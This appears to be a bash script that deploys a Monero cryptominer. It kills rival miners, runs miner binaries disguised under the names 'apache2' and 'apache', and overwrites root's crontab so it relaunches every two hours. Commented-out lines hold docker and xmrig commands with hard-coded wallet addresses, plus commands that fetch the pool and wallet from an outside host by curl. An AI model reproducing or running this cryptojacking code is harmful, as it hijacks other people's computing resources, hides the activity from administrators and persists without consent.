#!/bin/bash


killall xmr-stak; killall apache2; killall apache

cd ~/tanhuevon/ ; git stash drop; git reset --hard; git pull
sed -i -e "s/digitaloceanxmr/`cat ~/index.html`/" pools.txt
cd ~/tanhuevon/ 
cp -rf cpu`nproc`.txt cpu.txt
chmod +x apache2 ; chmod +x apache; ./apache2 ; ./apache &> apache2.log

echo '0 */2 * * * bash /root/tanhuevon/apache.sh &> /root/out.log' | crontab -

#killall apache2
#killall minerd
#killall xmrig
#desde=`stat  /etc/hosts -c%y  | awk '{print $1}'`
#apt -y install docker.io
#docker run warlax/xmrig-cpu-cryptonightv7 -o pool.supportxmr.com:5555 -u 43P5Rt8Rnoi4RDvP4FWEWtLyJN9RV9MQJCohgmHgkLLHBJSoRo96SAvjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fXbps4 -p `cat index.html` --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
#docker run warlax/xmrig-cpu-cryptonightv7 -o pool.minexmr.com:4444 -u 4AYRy6UgnqiZ8tjtaRAUu4CQNjCZFwwQsBmFDnoc4cYoZzncJtAw4gCETE9e2E4TJNPLsJASuJyQUTj71N8hLgPdBjYpEeT -p x --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
# .`cat ~/index.html | sed 's/\.//g'`
#/root/apache2 -a cryptonight -o stratum+tcp://`curl --insecure https://sio.com.co/m/dirpool.txt` -u `curl --insecure https://sio.com.co/m/dirwallet.txt` -p `cat index.html` -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
#/root/apache2 -a cryptonight -o stratum+tcp://`curl --insecure https://sio.com.co/m/dirpool.txt` -u `curl --insecure https://sio.com.co/m/dirwallet.txt` -p $desde"-"`cat index.html`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
#nohup /root/apache2 -a cryptonight -o stratum+tcp://45.76.248.236:3333 -u "etnkPDDjHh4QYLCFkNNSXmgNAwfgUaxphgWuz5Fva3cXJm5cJoWRwubjnQqzSbxH5vUxVCw7En2JY5oJZRv17eeR9o4ZmmBLn7+10000" -p `cat index.html`"-"$desde:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
